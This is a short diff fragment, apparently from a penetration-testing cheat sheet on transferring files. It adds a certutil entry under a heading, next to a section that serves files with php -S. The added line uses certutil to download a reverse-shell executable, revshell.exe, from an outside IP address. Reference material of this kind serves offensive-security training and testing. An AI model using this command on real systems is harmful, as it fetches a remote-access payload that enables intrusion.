@@ -322,3 +322,4 @@ php -S 0.0.0.0:80
 ```
 
 # I. certutil <a name="certutil"></a>
+- `certutil -urlcache -f http://10.1.23.11/revshell.exe revshell.exe`
